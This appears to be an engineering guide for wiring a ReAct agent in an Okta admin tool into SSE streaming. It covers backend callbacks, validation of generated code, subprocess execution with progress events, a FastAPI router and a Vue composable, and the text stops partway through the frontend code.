# ReAct Agent Streaming Integration Guide

## Overview

This document describes how to integrate the One-ReAct agent with the existing SSE streaming infrastructure to match `realtime_hybrid.py` output format (no frontend changes needed).

**Key Requirements:**
1. **Create new `react_stream.py` router** - Separate from Tako multi-agent
2. **Stream thinking steps only** - Show "🎯 STARTING" and "💭 Reasoning" text (NOT probe data)
3. **Security validation** - Scan generated code before execution
4. **Subprocess streaming** - Execute script with live `__PROGRESS__` events (proven pattern)
5. **Match realtime_hybrid JSON** - Same SSE event structure for frontend compatibility

**What Frontend Sees:**
- Discovery: "Loading endpoints...", "Probing group API...", "Synthesizing script..."
- Execution: "Validating security...", "Executing script...", then `__PROGRESS__` events
- Results: Final CSV/JSON output via DataDisplay component

---

## Architecture Pattern

### **Current Tako Multi-Agent Flow**
```
User Query
    ↓
ModernExecutionManager.execute_query()
    ↓
Planning Agent → Generates complete plan upfront
    ↓
Execute steps sequentially:
    - SQL Agent → Generate query → Execute
    - API Agent → Generate code → Execute
    ↓
Results Formatter → Process data
    ↓
Stream formatted results to UI
```

### **ReAct Agent Flow (Target)**
```
User Query
    ↓
ReActAgentExecutor.execute_react_query_with_streaming()
    ↓
ReAct Agent Loop (Dynamic):
    Step 1: Load endpoints → Stream: "Loading API catalog..."
    Step 2: Filter operations → Stream: "Filtering relevant endpoints..."
    Step 3: Get code prompt → Stream: "Analyzing API requirements..."
    Step 4: Probe group → Stream: "Testing group API..." (NO sample data to UI)
    Step 5: Probe members → Stream: "Testing members API..." (NO sample data to UI)
    Step 6: Probe user details → Stream: "Testing user endpoints..." (NO sample data to UI)
    Step 7: Generate code → Stream: "Synthesizing production script..."
    ↓
Security Validation:
    - Validate imports (whitelist check)
    - Validate API endpoints (no external URLs)
    - Validate file operations (restrict paths)
    ↓
Subprocess Execution:
    - Execute script in isolated subprocess
    - Stream progress: "Processing 10/50 users..."
    - Capture output incrementally
    ↓
Stream Results:
    - Chunk large datasets (500 records/chunk)
    - Format for DataDisplay component
    - Send completion event
```

---

## Implementation Guide

### **Phase 1: Add SSE Callbacks to ReAct Agent**

#### **1.1 Update ReactAgentDependencies**

**File:** `src/core/agents/one_react_agent.py`

```python
@dataclass
class ReactAgentDependencies:
    """Dependencies injected into ReAct agent"""
    correlation_id: str
    endpoints: List[Dict[str, Any]]
    lightweight_entities: Dict[str, Any]
    okta_client: Any
    sqlite_connection: Any
    operation_mapping: Dict[str, Any]
    user_query: str
    
    # NEW: SSE streaming callbacks (matching Tako pattern)
    step_start_callback: Optional[callable] = None
    step_end_callback: Optional[callable] = None
    step_progress_callback: Optional[callable] = None
    step_tokens_callback: Optional[callable] = None
    subprocess_progress_callback: Optional[callable] = None  # For final script execution
    
    # NEW: Step tracking for UI
    current_step: int = 0
    total_steps_estimate: int = 8  # Typical ReAct flow: 7 discovery + 1 execution
    
    # Existing circuit breakers
    sql_execution_count: int = 0
    api_execution_count: int = 0
    # ... rest
```

---

#### **1.2 Update log_progress Tool**

**Emit SSE events for thinking steps (NO data to UI):**

```python
async def log_progress(
    action: str,
    reasoning: str,
    status: Literal["starting", "completed", "thinking"] = "starting"
) -> Dict[str, Any]:
    """
    Log progress with SSE streaming support.
    
    IMPORTANT: Only sends action/reasoning to UI, NOT probe results.
    """
    logger.info(f"[{deps.correlation_id}] 🎯 {status.upper()}: {action}")
    logger.info(f"[{deps.correlation_id}] 💭 Reasoning: {reasoning}")
    
    # Emit SSE event for UI progress tracking
    if deps.step_start_callback and status == "starting":
        await deps.step_start_callback(
            step_number=deps.current_step,
            step_type="react_discovery",
            step_name=action,  # "Loading API endpoints", "Probing group API"
            query_context=reasoning,  # WHY we're doing this step
            critical=False,  # Discovery steps are not critical
            formatted_time=time.strftime('%H:%M:%S')
        )
        deps.current_step += 1
    
    elif deps.step_end_callback and status == "completed":
        await deps.step_end_callback(
            step_number=deps.current_step - 1,
            step_type="react_discovery",
            success=True,
            duration_seconds=0,  # Calculated externally if needed
            record_count=0,  # Not applicable for discovery
            formatted_time=time.strftime('%H:%M:%S')
        )
    
    return {"status": "logged", "action": action}
```

**Key Point:** `query_context` contains reasoning (why), NOT probe results (what data).

---

#### **1.3 Update execute_test_query Tool**

**Emit start/end events but DO NOT send sample data to UI:**

```python
async def execute_test_query(
    code: str,
    code_type: Literal["sql", "python_sdk"]
) -> Dict[str, Any]:
    """
    Execute test query with SSE events.
    
    CRITICAL: Probe results stay in agent context, NOT sent to UI.
    """
    
    # Start event: Show we're testing, but don't send code
    if deps.step_start_callback:
        await deps.step_start_callback(
            step_number=deps.current_step,
            step_type=f"react_probe_{code_type}",
            step_name=f"Executing {code_type.upper()} probe query",
            query_context=f"Testing API structure with max_results=3",  # Generic message
            critical=False,
            formatted_time=time.strftime('%H:%M:%S')
        )
    
    start_time = time.time()
    
    # Execute probe (existing logic)
    result = await _execute_code(code, code_type)
    
    # End event: Show completion, but don't send sample_results to UI
    if deps.step_end_callback:
        await deps.step_end_callback(
            step_number=deps.current_step,
            step_type=f"react_probe_{code_type}",
            success=result["success"],
            duration_seconds=time.time() - start_time,
            record_count=result["total_records"],  # Just the count
            formatted_time=time.strftime('%H:%M:%S'),
            error_message=result.get("error")
        )
    
    deps.current_step += 1
    
    # Return full results to AGENT (for learning), but UI only sees count
    return result  # Contains sample_results for agent context
```

**Key Point:** UI sees "Executed probe, found 3 records" but NOT the actual JSON.

---

### **Phase 2: Create Execution Wrapper**

#### **2.1 New File: one_react_agent_executor.py**

**Purpose:** Wrap ReAct agent execution with streaming, validation, and subprocess execution.

**File:** `src/core/agents/one_react_agent_executor.py`

```python
"""
ReAct Agent Executor with SSE Streaming and Subprocess Execution

Integrates One-ReAct agent with Tako's streaming infrastructure:
1. Discovery phase: Stream thinking steps (no probe data)
2. Code generation: Stream synthesis progress
3. Validation: Security check generated code
4. Execution: Run script in subprocess with live progress
5. Results: Stream final data to UI
"""

from typing import Dict, Any, Optional, List
import asyncio
import time
import os
import subprocess
from pathlib import Path

from src.core.agents.one_react_agent import (
    execute_react_query, 
    ReactAgentDependencies,
    ExecutionResult
)
from src.core.security import validate_generated_code
from src.utils.logging import get_logger

logger = get_logger("okta_ai_agent")


async def execute_react_query_with_streaming(
    user_query: str,
    correlation_id: str,
    endpoints: List[Dict[str, Any]],
    lightweight_entities: Dict[str, Any],
    okta_client: Any,
    sqlite_connection: Any,
    operation_mapping: Dict[str, Any],
    # SSE callbacks
    step_start_callback: Optional[callable] = None,
    step_end_callback: Optional[callable] = None,
    step_progress_callback: Optional[callable] = None,
    step_tokens_callback: Optional[callable] = None,
    subprocess_progress_callback: Optional[callable] = None
) -> Dict[str, Any]:
    """
    Execute ReAct agent with full streaming support
    
    Returns:
        Dict with structure matching ModernExecutionManager:
        {
            "success": bool,
            "correlation_id": str,
            "total_steps": int,
            "successful_steps": int,
            "failed_steps": int,
            "step_results": List[Dict],
            "processed_summary": Dict,  # For UI display
            "usage": Dict  # Token usage
        }
    """
    
    # ========================================
    # PHASE 1: Discovery (ReAct Agent)
    # ========================================
    
    logger.info(f"[{correlation_id}] Starting ReAct agent discovery phase")
    
    # Create dependencies with callbacks
    deps = ReactAgentDependencies(
        correlation_id=correlation_id,
        endpoints=endpoints,
        lightweight_entities=lightweight_entities,
        okta_client=okta_client,
        sqlite_connection=sqlite_connection,
        operation_mapping=operation_mapping,
        user_query=user_query,
        # Register SSE callbacks
        step_start_callback=step_start_callback,
        step_end_callback=step_end_callback,
        step_progress_callback=step_progress_callback,
        step_tokens_callback=step_tokens_callback,
        subprocess_progress_callback=subprocess_progress_callback,
        current_step=1
    )
    
    # Emit initial thinking event
    if step_start_callback:
        await step_start_callback(
            step_number=0,
            step_type="react_init",
            step_name="Initializing ReAct agent",
            query_context=f"Analyzing query: {user_query}",
            critical=False,
            formatted_time=time.strftime('%H:%M:%S')
        )
    
    # Execute ReAct agent (discovery + code generation)
    try:
        result, usage = await execute_react_query(user_query, deps)
    except Exception as e:
        logger.error(f"[{correlation_id}] ReAct agent failed: {e}", exc_info=True)
        return {
            "success": False,
            "correlation_id": correlation_id,
            "total_steps": deps.current_step,
            "successful_steps": 0,
            "failed_steps": 1,
            "step_results": [],
            "processed_summary": {
                "type": "error",
                "content": f"ReAct agent error: {str(e)}"
            },
            "usage": {"total_tokens": 0}
        }
    
    # Check if code was generated
    if not result.complete_production_code:
        logger.error(f"[{correlation_id}] No production code generated")
        return {
            "success": False,
            "correlation_id": correlation_id,
            "total_steps": deps.current_step,
            "successful_steps": deps.current_step - 1,
            "failed_steps": 1,
            "step_results": [],
            "processed_summary": {
                "type": "error",
                "content": "ReAct agent completed but generated no executable code"
            },
            "usage": {
                "total_tokens": usage.total_tokens if usage else 0
            }
        }
    
    logger.info(f"[{correlation_id}] ReAct discovery complete - {len(result.complete_production_code)} chars of code")
    
    # ========================================
    # PHASE 2: Security Validation
    # ========================================
    
    if step_start_callback:
        await step_start_callback(
            step_number=deps.current_step,
            step_type="security_validation",
            step_name="Validating generated code security",
            query_context="Checking imports, endpoints, file operations",
            critical=True,
            formatted_time=time.strftime('%H:%M:%S')
        )
    
    validation_start = time.time()
    validation_result = validate_generated_code(
        code=result.complete_production_code,
        correlation_id=correlation_id
    )
    
    if not validation_result["is_safe"]:
        logger.error(f"[{correlation_id}] Security validation failed: {validation_result['violations']}")
        
        if step_end_callback:
            await step_end_callback(
                step_number=deps.current_step,
                step_type="security_validation",
                success=False,
                duration_seconds=time.time() - validation_start,
                record_count=0,
                formatted_time=time.strftime('%H:%M:%S'),
                error_message=f"Security violations: {', '.join(validation_result['violations'])}"
            )
        
        return {
            "success": False,
            "correlation_id": correlation_id,
            "total_steps": deps.current_step,
            "successful_steps": deps.current_step - 1,
            "failed_steps": 1,
            "step_results": [],
            "processed_summary": {
                "type": "security_error",
                "content": f"Generated code failed security validation: {validation_result['violations']}"
            },
            "usage": {
                "total_tokens": usage.total_tokens if usage else 0
            }
        }
    
    if step_end_callback:
        await step_end_callback(
            step_number=deps.current_step,
            step_type="security_validation",
            success=True,
            duration_seconds=time.time() - validation_start,
            record_count=0,
            formatted_time=time.strftime('%H:%M:%S')
        )
    
    deps.current_step += 1
    logger.info(f"[{correlation_id}] Security validation passed")
    
    # ========================================
    # PHASE 3: Subprocess Execution
    # ========================================
    
    if step_start_callback:
        await step_start_callback(
            step_number=deps.current_step,
            step_type="script_execution",
            step_name="Executing production script",
            query_context="Running generated code in isolated subprocess",
            critical=True,
            formatted_time=time.strftime('%H:%M:%S')
        )
    
    # Save code to temporary file
    temp_dir = Path("src/core/data/testing")
    temp_dir.mkdir(parents=True, exist_ok=True)
    script_path = temp_dir / f"react_generated_{correlation_id}.py"
    
    try:
        with open(script_path, 'w', encoding='utf-8') as f:
            f.write(result.complete_production_code)
        
        logger.info(f"[{correlation_id}] Saved script to {script_path}")
        
        # Execute with streaming progress
        execution_result = await _execute_subprocess_with_streaming(
            script_path=script_path,
            correlation_id=correlation_id,
            progress_callback=subprocess_progress_callback,
            timeout_seconds=180  # 3 minutes
        )
        
        if step_end_callback:
            await step_end_callback(
                step_number=deps.current_step,
                step_type="script_execution",
                success=execution_result["success"],
                duration_seconds=execution_result["duration_seconds"],
                record_count=execution_result.get("record_count", 0),
                formatted_time=time.strftime('%H:%M:%S'),
                error_message=execution_result.get("error")
            )
        
        deps.current_step += 1
        
        # ========================================
        # PHASE 4: Format Results for UI
        # ========================================
        
        if execution_result["success"]:
            processed_summary = {
                "type": "code_execution_success",
                "content": execution_result.get("output", ""),
                "generated_code": result.complete_production_code,
                "execution_plan": result.execution_plan,
                "steps_taken": result.steps_taken,
                "record_count": execution_result.get("record_count", 0),
                "output_file": execution_result.get("output_file")
            }
        else:
            processed_summary = {
                "type": "code_execution_error",
                "content": execution_result.get("error", "Unknown error"),
                "generated_code": result.complete_production_code,
                "stderr": execution_result.get("stderr", "")
            }
        
        return {
            "success": execution_result["success"],
            "correlation_id": correlation_id,
            "total_steps": deps.current_step,
            "successful_steps": deps.current_step if execution_result["success"] else deps.current_step - 1,
            "failed_steps": 0 if execution_result["success"] else 1,
            "step_results": [
                {"step": i, "success": True} 
                for i in range(1, deps.current_step)
            ],
            "processed_summary": processed_summary,
            "usage": {
                "total_tokens": usage.total_tokens if usage else 0,
                "input_tokens": usage.input_tokens if usage else 0,
                "output_tokens": usage.output_tokens if usage else 0,
                "requests": usage.requests if usage else 0
            }
        }
        
    except Exception as e:
        logger.error(f"[{correlation_id}] Script execution failed: {e}", exc_info=True)
        
        if step_end_callback:
            await step_end_callback(
                step_number=deps.current_step,
                step_type="script_execution",
                success=False,
                duration_seconds=0,
                record_count=0,
                formatted_time=time.strftime('%H:%M:%S'),
                error_message=str(e)
            )
        
        return {
            "success": False,
            "correlation_id": correlation_id,
            "total_steps": deps.current_step,
            "successful_steps": deps.current_step - 1,
            "failed_steps": 1,
            "step_results": [],
            "processed_summary": {
                "type": "execution_error",
                "content": f"Script execution failed: {str(e)}",
                "generated_code": result.complete_production_code
            },
            "usage": {
                "total_tokens": usage.total_tokens if usage else 0
            }
        }
    
    finally:
        # Cleanup temporary file
        if script_path.exists():
            try:
                script_path.unlink()
                logger.info(f"[{correlation_id}] Cleaned up temporary script")
            except Exception as cleanup_error:
                logger.warning(f"[{correlation_id}] Failed to cleanup {script_path}: {cleanup_error}")


async def _execute_subprocess_with_streaming(
    script_path: Path,
    correlation_id: str,
    progress_callback: Optional[callable],
    timeout_seconds: int
) -> Dict[str, Any]:
    """
    Execute Python script in subprocess with live progress streaming.
    
    Uses PROVEN pattern from ModernExecutionManager._execute_subprocess_with_streaming:
    1. Scripts print __PROGRESS__ {json} to stderr
    2. Async readers capture stdout/stderr concurrently
    3. Parse JSON events from stderr and emit via callback
    4. Frontend gets real-time incremental progress
    
    Supported event types from generated scripts:
    - entity_start: Starting operation (e.g., "Processing 15 users")
    - entity_progress: Progress update (e.g., "10/15 complete - 66%")
    - entity_complete: Operation finished with status
    - api_call_limit: API pagination constraint (max_results=3 for probes)
    """
    
    logger.info(f"[{correlation_id}] Starting subprocess execution: {script_path}")
    
    # Get Python executable (UV or venv)
    python_exe = sys.executable
    
    # Build command
    cmd = [python_exe, str(script_path)]
    
    start_time = time.time()
    stdout_lines = []
    stderr_lines = []
    
    try:
        # Create subprocess with stdout/stderr capture
        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=os.getcwd()
        )
        
        # Stream stdout in real-time (user output)
        async def read_stdout():
            async for line in process.stdout:
                line_str = line.decode('utf-8', errors='ignore').strip()
                if line_str:
                    stdout_lines.append(line_str)
                    logger.debug(f"[{correlation_id}] STDOUT: {line_str}")
        
        # Stream stderr in real-time (progress events)
        async def read_stderr():
            async for line in process.stderr:
                line_str = line.decode('utf-8', errors='ignore').strip()
                if line_str:
                    stderr_lines.append(line_str)
                    
                    # PROVEN PATTERN: Parse __PROGRESS__ JSON events
                    if line_str.startswith("__PROGRESS__"):
                        try:
                            # Extract JSON after __PROGRESS__ marker
                            json_str = line_str.replace("__PROGRESS__", "").strip()
                            event_data = json.loads(json_str)
                            
                            # Emit progress event via callback
                            if progress_callback:
                                await progress_callback(
                                    event_type="subprocess_progress",
                                    event_data=event_data,
                                    correlation_id=correlation_id
                                )
                                
                            logger.debug(f"[{correlation_id}] PROGRESS: {event_data.get('type', 'unknown')} - {event_data.get('label', 'N/A')}")
                        
                        except json.JSONDecodeError as je:
                            logger.warning(f"[{correlation_id}] Failed to parse progress JSON: {json_str} - {je}")
                    
                    # Also log regular stderr (errors, warnings)
                    elif "ERROR" in line_str or "WARNING" in line_str:
                        logger.warning(f"[{correlation_id}] STDERR: {line_str}")
        
        # Wait for process with timeout (concurrent reading)
        try:
            await asyncio.gather(
                read_stdout(),
                read_stderr(),
                asyncio.wait_for(process.wait(), timeout=timeout_seconds)
            )
        except asyncio.TimeoutError:
            process.kill()
            await process.wait()
            raise TimeoutError(f"Script execution exceeded {timeout_seconds}s timeout")
        
        duration = time.time() - start_time
        returncode = process.returncode
        
        # Parse output for record count (fallback if no progress events)
        record_count = 0
        for line in stdout_lines:
            if "processed" in line.lower() or "total" in line.lower():
                import re
                numbers = re.findall(r'\d+', line)
                if numbers:
                    record_count = int(numbers[-1])
        
        if returncode == 0:
            logger.info(f"[{correlation_id}] Subprocess completed successfully in {duration:.2f}s")
            return {
                "success": True,
                "duration_seconds": duration,
                "output": "\n".join(stdout_lines),
                "record_count": record_count,
                "returncode": returncode
            }
        else:
            logger.error(f"[{correlation_id}] Subprocess failed with code {returncode}")
            return {
                "success": False,
                "duration_seconds": duration,
                "error": f"Process exited with code {returncode}",
                "stderr": "\n".join(stderr_lines),
                "output": "\n".join(stdout_lines),
                "returncode": returncode
            }
    
    except Exception as e:
        duration = time.time() - start_time
        logger.error(f"[{correlation_id}] Subprocess execution exception: {e}", exc_info=True)
        return {
            "success": False,
            "duration_seconds": duration,
            "error": str(e),
            "stderr": "\n".join(stderr_lines),
            "output": "\n".join(stdout_lines)
        }
```

---

### **Phase 3: Create New Router (react_stream.py)**

#### **3.1 NEW FILE: src/api/routers/react_stream.py**

**Create separate router for ReAct agent (don't modify realtime_hybrid.py):**

```python
"""
React Agent SSE Streaming Router

Separate router for One-ReAct agent with same SSE format as realtime_hybrid.py
No frontend changes needed - reuses existing event handlers.
"""

from fastapi import APIRouter, HTTPException, Depends, Request
from fastapi.responses import StreamingResponse as EventSourceResponse
from typing import Dict, Any, Optional
import asyncio
import time
import json
from uuid import uuid4

from src.api.routers.auth import get_current_user, AuthUser
from src.core.agents.one_react_agent_executor import execute_react_query_with_streaming
from src.core.orchestration.modern_execution_manager import modern_executor
from src.utils.logging import get_logger, set_correlation_id

logger = get_logger("okta_ai_agent")

router = APIRouter(prefix="/react-agent", tags=["react-agent"])

# Same process tracking as realtime_hybrid.py
active_processes: Dict[str, Dict[str, Any]] = {}

class ProcessStatus:
    PLAN_GENERATION = "plan_generation"
    EXECUTING = "executing"
    COMPLETED = "completed"
    ERROR = "error"
    CANCELLED = "cancelled"

class ExecutionEventType:
    STEP_START = "STEP-START"
    STEP_END = "STEP-END"
    STEP_PROGRESS = "STEP-PROGRESS"
    STEP_TOKENS = "STEP-TOKENS"
    COMPLETE = "COMPLETE"
    ERROR = "ERROR"

def create_execution_event(event_type: str, process_id: str, data: Dict[str, Any]) -> str:
    """Create SSE event matching realtime_hybrid.py format"""
    return json.dumps({
        "type": event_type,
        "content": {
            "process_id": process_id,
            **data
        }
    })

# NEW ENDPOINT: Start ReAct process
@router.post("/start-react-process", response_model=StartProcessResponse)
async def start_react_process_endpoint(
    request: Request,
    payload: RealtimeQueryRequest,
    current_user: AuthUser = Depends(get_current_user)
):
    """
    Start ReAct agent execution
    
    Returns minimal "plan" (ReAct doesn't plan upfront - discovers dynamically)
    """
    process_id = str(uuid4())
    sanitized_query, warnings = sanitize_query(payload.query)
    
    if not sanitized_query:
        raise HTTPException(status_code=400, detail="Invalid query")
    
    # Check database health (same as Tako)
    db_health = modern_executor.is_database_healthy()
    
    # Initialize process
    active_processes[process_id] = {
        "status": ProcessStatus.PLAN_GENERATION,
        "query": sanitized_query,
        "user": current_user.username if current_user else None,
        "cancelled": False,
        "created_at": time.time(),
        "mode": "react_agent"
    }
    
    logger.info(f"[{process_id}] Created ReAct process for query: {sanitized_query}")
    
    # Return minimal plan (ReAct discovers steps dynamically)
    return StartProcessResponse(
        process_id=process_id,
        plan=ApiPlan(
            original_query=sanitized_query,
            reasoning="ReAct agent will discover optimal steps dynamically through reasoning",
            confidence=0.9,
            steps=[
                ApiStep(
                    id=1,
                    tool_name="react_discovery",
                    query_context={"description": "Dynamic step-by-step API discovery and code generation"},
                    reason="ReAct agent explores APIs, learns structure, and generates production code",
                    critical=True,
                    status="pending"
                )
            ]
        )
    )


# NEW ENDPOINT: Stream ReAct execution
@router.get("/stream-react-updates/{process_id}")
async def stream_react_updates_endpoint(
    process_id: str,
    request: Request,
    current_user: AuthUser = Depends(get_current_user)
):
    """
    Stream ReAct agent execution via SSE
    
    Emits same event types as Tako multi-agent:
    - STEP-START: Discovery/execution steps
    - STEP-END: Completion status
    - STEP-PROGRESS: Subprocess progress
    - STEP-TOKENS: LLM token usage
    - COMPLETE: Final results
    """
    
    if process_id not in active_processes:
        raise HTTPException(status_code=404, detail="Process not found")
    
    async def react_event_generator():
        set_correlation_id(process_id)
        logger.info(f"[{process_id}] Starting ReAct SSE stream")
        
        try:
            # Event queue for callbacks
            event_queue = asyncio.Queue()
            
            # Define callbacks (same pattern as Tako)
            async def on_step_start(step_number, step_type, step_name, query_context, critical, formatted_time):
                await event_queue.put(create_execution_event(
                    ExecutionEventType.STEP_START,
                    process_id,
                    {
                        "step_number": step_number,
                        "step_type": step_type,
                        "step_name": step_name,
                        "query_context": query_context,  # Reasoning, NOT data
                        "critical": critical,
                        "formatted_time": formatted_time
                    }
                ))
            
            async def on_step_end(step_number, step_type, success, duration_seconds, record_count, formatted_time, error_message=None):
                await event_queue.put(create_execution_event(
                    ExecutionEventType.STEP_END,
                    process_id,
                    {
                        "step_number": step_number,
                        "step_type": step_type,
                        "success": success,
                        "duration_seconds": duration_seconds,
                        "record_count": record_count,
                        "formatted_time": formatted_time,
                        "error_message": error_message
                    }
                ))
            
            async def on_subprocess_progress(event_type, event_data, correlation_id):
                await event_queue.put(create_execution_event(
                    ExecutionEventType.STEP_PROGRESS,
                    process_id,
                    {
                        "message": event_data.get("message", ""),
                        "timestamp": event_data.get("timestamp", time.time())
                    }
                ))
            
            async def on_step_tokens(step_number, step_type, input_tokens, output_tokens, agent_name, formatted_time):
                await event_queue.put(create_execution_event(
                    ExecutionEventType.STEP_TOKENS,
                    process_id,
                    {
                        "step_number": step_number,
                        "input_tokens": input_tokens,
                        "output_tokens": output_tokens,
                        "agent_name": agent_name,
                        "formatted_time": formatted_time
                    }
                ))
            
            # Initialize Okta client and SQLite connection (from modern_executor)
            from src.core.okta.client.base_okta_api_client import OktaAPIClient
            from src.core.sqlite_meta.sqlite_manager import get_sqlite_connection
            
            okta_client = OktaAPIClient()
            sqlite_conn = await get_sqlite_connection()
            
            # Create execution task
            execution_task = asyncio.create_task(
                execute_react_query_with_streaming(
                    user_query=active_processes[process_id]["query"],
                    correlation_id=process_id,
                    endpoints=modern_executor.endpoints,
                    lightweight_entities=modern_executor.simple_ref_data,
                    okta_client=okta_client,
                    sqlite_connection=sqlite_conn,
                    operation_mapping=modern_executor.operation_mapping,
                    step_start_callback=on_step_start,
                    step_end_callback=on_step_end,
                    subprocess_progress_callback=on_subprocess_progress,
                    step_tokens_callback=on_step_tokens
                )
            )
            
            # Stream events while execution runs
            while not execution_task.done():
                try:
                    event = await asyncio.wait_for(event_queue.get(), timeout=0.1)
                    yield {"event": "execution", "data": event}
                except asyncio.TimeoutError:
                    continue
            
            # Get result
            result = await execution_task
            
            # Process remaining events
            while not event_queue.empty():
                event = await event_queue.get()
                yield {"event": "execution", "data": event}
            
            # Send completion event
            if result["success"]:
                yield {
                    "event": "complete",
                    "data": json.dumps({
                        "type": "COMPLETE",
                        "content": {
                            "process_id": process_id,
                            "success": True,
                            "data": result["processed_summary"]
                        }
                    })
                }
            else:
                yield {
                    "event": "error",
                    "data": json.dumps({
                        "type": "ERROR",
                        "content": {
                            "process_id": process_id,
                            "error": result["processed_summary"].get("content", "Unknown error")
                        }
                    })
                }
            
        except Exception as e:
            logger.error(f"[{process_id}] Stream error: {e}", exc_info=True)
            yield {
                "event": "error",
                "data": json.dumps({
                    "type": "ERROR",
                    "content": {
                        "process_id": process_id,
                        "error": str(e)
                    }
                })
            }
        
        finally:
            active_processes[process_id]["status"] = ProcessStatus.COMPLETED
    
    return EventSourceResponse(react_event_generator())


# NEW ENDPOINT: Cancel ReAct process
@router.post("/cancel/{process_id}")
async def cancel_react_process(
    process_id: str,
    current_user: AuthUser = Depends(get_current_user)
):
    """Cancel ReAct agent execution (same as Tako)"""
    if process_id not in active_processes:
        raise HTTPException(status_code=404, detail="Process not found")
    
    active_processes[process_id]["cancelled"] = True
    active_processes[process_id]["status"] = ProcessStatus.CANCELLED
    
    logger.warning(f"[{process_id}] ReAct process cancelled by user")
    
    return {"status": "cancelled", "process_id": process_id}
```

**Register router in main.py:**

```python
# In src/api/main.py
from src.api.routers import react_stream

app.include_router(react_stream.router)
```
```

---

### **Phase 4: Frontend Integration**

#### **4.1 Create useReactStream.js Composable**

**NEW FILE:** `src/frontend/src/composables/useReactStream.js`

**Simplified version of useRealtimeStream.js for ReAct agent:**

```javascript
/**
 * Composable for ReAct Agent SSE streaming
 * Simpler than useRealtimeStream - ReAct has linear discovery flow
 */
import { ref, reactive, watch, toRefs } from 'vue'
import { useAuth } from '@/composables/useAuth'

export function useReactStream() {
    const auth = useAuth()

    // Connection state
    const isLoading = ref(false)
    const isProcessing = ref(false)
    const isStreaming = ref(false)
    const error = ref(null)
    const activeEventSource = ref(null)
    const processId = ref(null)

    // Execution state (simpler than Tako)
    const execution = reactive({
        status: "idle", // idle, discovering, validating, executing, completed, error
        currentStep: null, // Current discovery step text
        currentReasoning: null, // Current reasoning text
        discoverySteps: [], // Array of {step, reasoning, timestamp}
        generatedCode: null, // Final generated code
        results: null, // Final execution results
        tokenUsage: null // Token usage stats
    })

    /**
     * Start ReAct process
     */
    const startProcess = async (query) => {
        if (!query?.trim()) return null

        // Reset state
        isLoading.value = true
        isProcessing.value = true
        error.value = null
        execution.status = "discovering"
        execution.discoverySteps = []
        execution.currentStep = null
        execution.currentReasoning = null
        execution.generatedCode = null
        execution.results = null
        execution.tokenUsage = null

        try {
            const response = await fetch("/api/react-agent/start-react-process", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                credentials: "include",
                body: JSON.stringify({ query: query.trim() })
            })

            if (!response.ok) {
                if (response.status === 401 || response.status === 403) {
                    await auth.logout()
                    window.location.href = '/login'
                    return null
                }
                throw new Error(`HTTP ${response.status}`)
            }

            const data = await response.json()
            processId.value = data.process_id

            return data.process_id
        } catch (err) {
            console.error("Error starting ReAct process:", err)
            error.value = err.message || "Failed to start ReAct agent"
            execution.status = "error"
            isProcessing.value = false
            return null
        } finally {
            isLoading.value = false
        }
    }

    /**
     * Connect to ReAct SSE stream
     */
    const connectToStream = async (id) => {
        if (!id) return null

        try {
            if (activeEventSource.value) {
                activeEventSource.value.close()
                activeEventSource.value = null
            }

            const eventSource = new EventSource(
                `/api/react-agent/stream-react-updates/${id}`,
                { withCredentials: true }
            )
            activeEventSource.value = eventSource
            isStreaming.value = true

            // Handle messages
            eventSource.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data)
                    handleReactEvent(data)
                } catch (err) {
                    console.error("Error parsing SSE event:", err)
                }
            }

            eventSource.onerror = (e) => {
                console.error("SSE connection error:", e)
                if (execution.status !== "completed" && execution.status !== "error") {
                    error.value = "Connection lost"
                    execution.status = "error"
                    isProcessing.value = false
                    isStreaming.value = false
                }
                if (eventSource) eventSource.close()
                activeEventSource.value = null
            }

            return eventSource
        } catch (err) {
            console.error("Error connecting to ReAct stream:", err)
            error.value = "Failed to connect to stream"
            execution.status = "error"
            isStreaming.value = false
            isProcessing.value = false
            return null
        }
    }

    /**
     * Handle ReAct SSE events (same format as Tako)
     */
    const handleReactEvent = (data) => {
        const eventType = data.type
        const content = data.content

        switch (eventType) {
            case "STEP-START":
                handleStepStart(content)
                break
            case "STEP-END":
                handleStepEnd(content)
                break
            case "STEP-PROGRESS":
                handleStepProgress(content)
                break
            case "STEP-TOKENS":
                handleStepTokens(content)
                break
            case "COMPLETE":
                handleComplete(content)
                break
            case "ERROR":
                handleError(content)
                break
        }
    }

    /**
     * Handle STEP-START: Discovery step begins
     */
    const handleStepStart = (content) => {
        const stepType = content.step_type

        if (stepType === "react_discovery") {
            // Store discovery step (thinking text)
            execution.currentStep = content.step_name // "🎯 STARTING: Load API endpoints"
            execution.currentReasoning = content.query_context // "💭 Reasoning: ..."
            execution.discoverySteps.push({
                step: content.step_name,
                reasoning: content.query_context,
                timestamp: content.formatted_time
            })
        } else if (stepType === "security_validation") {
            execution.status = "validating"
            execution.currentStep = "Validating security..."
        } else if (stepType === "script_execution") {
            execution.status = "executing"
            execution.currentStep = "Executing production script..."
        }
    }

    /**
     * Handle STEP-END: Step completed
     */
    const handleStepEnd = (content) => {
        // Just mark step as done, UI shows checkmark
    }

    /**
     * Handle STEP-PROGRESS: Subprocess progress events
     */
    const handleStepProgress = (content) => {
        // Update current step with progress message
        if (content.message) {
            execution.currentStep = content.message
        }
    }

    /**
     * Handle STEP-TOKENS: Token usage
     */
    const handleStepTokens = (content) => {
        execution.tokenUsage = {
            inputTokens: content.input_tokens,
            outputTokens: content.output_tokens,
            totalTokens: (content.input_tokens || 0) + (content.output_tokens || 0)
        }
    }

    /**
     * Handle COMPLETE: Final results
     */
    const handleComplete = (content) => {
        const summary = content.data || content

        execution.results = {
            content: summary.content || summary.output,
            generatedCode: summary.generated_code,
            executionPlan: summary.execution_plan,
            recordCount: summary.record_count,
            outputFile: summary.output_file
        }

        execution.status = "completed"
        isProcessing.value = false
        isStreaming.value = false

        if (activeEventSource.value) {
            activeEventSource.value.close()
            activeEventSource.value = null
        }
    }

    /**
     * Handle ERROR
     */
    const handleError = (content) => {
        error.value = content.error || content.message || "Unknown error"
        execution.status = "error"
        isProcessing.value = false
        isStreaming.value = false

        if (activeEventSource.value) {
            activeEventSource.value.close()
            activeEventSource.value = null
        }
    }

    /**
     * Cancel ReAct process
     */
    const cancelProcess = async () => {
        if (!processId.value) return

        try {
            await fetch(`/api/react-agent/cancel/${processId.value}`, {
                method: "POST",
                credentials: "include"
            })

            execution.status = "cancelled"
            isProcessing.value = false
            isStreaming.value = false

